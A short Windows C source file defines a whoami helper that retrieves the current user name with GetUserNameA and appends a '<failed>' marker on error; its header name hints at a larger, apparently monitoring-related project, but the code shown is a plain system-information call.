#include "includes/espia_func.h"

void whoami(PSTR buffer, PDWORD size) {
    if (GetUserNameA(buffer, size) == 0) {
        Debug(printf("Failed to retrieve the Hostname\n"));
        strcat(buffer, "<failed>");
    }
}